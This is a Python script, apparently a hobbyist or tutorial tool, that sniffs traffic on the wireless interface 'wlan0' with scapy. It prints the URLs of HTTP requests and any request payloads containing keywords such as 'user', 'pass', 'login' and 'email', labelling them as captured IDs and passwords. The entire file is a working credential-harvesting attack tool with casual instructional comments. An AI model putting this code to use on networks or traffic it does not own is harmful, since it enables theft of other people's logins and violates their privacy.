#!/usr/env/bin/ python3

import scapy.all as scapy
from scapy_http import http
from colorama import Fore, Back, Style


def check_root_or_not():
    try:
        scapy.srp(scapy.Ether(), verbose=False, timeout=0.5)
    except PermissionError:
        print("\n[-] Kindly re-run with root privileges.\n")
        exit(0)


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    # 'prn' is used to specify where (a function) should it return the SNIFFED PACKETS.
    # 'filter' is used to specify filter type using Berkeley Packet Filter (BPF) syntax.
    # Go to this link to find more about the Filter type you can use - https://biot.com/capstats/bpf.html
    # Note - Problem is that it cannot filter 'http' packets. So we have to 'scapy-http' for that :)


def process_sniffed_packet(packet):

    if packet.haslayer(http.HTTPRequest):  # Printing all packets with a HTTP response layer. :)
        # print(packet.show())  # To print All Options in all layers of said Packet :D

        # To check and print website urls accessed.
        if packet[http.HTTPRequest].Path and packet[http.HTTPRequest].Host:
            possible_url = str(packet[http.HTTPRequest].Host) + str(packet[http.HTTPRequest].Path)
            print("\n[+] HTTP REQUEST >> " + Fore.BLUE + Style.NORMAL + str(possible_url) + Style.RESET_ALL)

        # To check and print username and passwords.
        if packet.haslayer(scapy.Raw):
            # print(packet[scapy.Raw].load)   # Prints load in RAW layer, however without validating if it contains
            # useful data or just gibberish.
            load = packet[scapy.Raw].load
            load = load.decode()   # .decode() here works to convert 'load' from bytes to string

            # Simple and rather primitive way to validate useful 'load's if "login" or "user" or "pass" in load:  #
            # To check for presence of substring to validate useful 'loads' ;) print(load)

            # Better Way To Do The Validation!
            keywords = ["user", "pass", "login", "acc", "input", "email", "key"]

            for keyword in keywords:
                if keyword in load:
                    print("\n[*] ID/Pass -> " + Fore.GREEN + Back.LIGHTRED_EX + Style.BRIGHT + str(load) +
                          Style.RESET_ALL)
                    break

        # print(packet)  # To Actually print the whole packet information XD


check_root_or_not()

sniff("wlan0")
